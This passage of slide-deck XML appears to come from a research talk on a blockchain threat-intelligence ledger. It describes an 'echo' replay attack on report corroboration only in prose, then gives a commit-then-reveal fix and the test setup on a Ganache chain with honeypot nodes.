          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Echo  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>36af…caf1</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   copied</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="echo attacker icon" descr="echo attacker">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="1417320"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="echo explanation"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="1965960"/>
            <a:ext cx="3566160" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A cheater reads the public ledger and re-posts every fingerprint under its own name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Now every report looks seen twice, so it counts as “corroborated”.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="echo stat"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="3246120"/>
            <a:ext cx="3566160" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>120 / 120</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="echo stat label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="3931920"/>
            <a:ext cx="3566160" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>single-node reports falsely corroborated, in about one second</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Our fix: commit, then reveal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="sealed bid icon" descr="sealed bid">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="384048" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="analogy header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1920240"/>
            <a:ext cx="3017520" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Like a sealed-bid auction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="analogy body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2377440"/>
            <a:ext cx="2926080" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Everyone hands in a sealed envelope first. Envelopes open only after bidding closes, so nobody can copy a bid they haven't seen.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="analogy divider"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3840480" y="1417320"/>
            <a:ext cx="9144" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="cr step 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="1371600"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="cr step 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="1371600"/>
            <a:ext cx="3886200" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Commit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Post c = H(i ‖ s ‖ h) with a random salt s. It reveals nothing about h.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="cr step 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="2194560"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="cr step 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="2194560"/>
            <a:ext cx="3886200" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reveal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Later, post ⟨R, i, s, h⟩ so any reader can check c.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="cr step 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4114800" y="3017520"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="cr step 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4709160" y="3017520"/>
            <a:ext cx="3886200" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Accept</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Count i only if its commitment came before the first reveal of h.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="cost panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3977640"/>
            <a:ext cx="8046720" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="cost note"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3977640"/>
            <a:ext cx="7680960" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cost: two transactions per IOC (2.0× gas). Late honest observers commit in the next epoch.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How we tested it</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="setup 1 check icon" descr="setup 1 check">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1490472"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="setup 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="1417320"/>
            <a:ext cx="3566160" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Live Ethereum-style chain, Ganache 7.9.2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="setup 2 check icon" descr="setup 2 check">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2093976"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="setup 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2020824"/>
            <a:ext cx="3566160" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1 to 16 honeypot nodes writing at once</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="setup 3 check icon" descr="setup 3 check">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2697480"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="setup 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2624328"/>
            <a:ext cx="3566160" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 repetitions, 95% confidence intervals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="setup 4 check icon" descr="setup 4 check">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3300984"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="setup 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3227832"/>
            <a:ext cx="3566160" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A real centralized hub, same test harness</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="setup 5 check icon" descr="setup 5 check">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
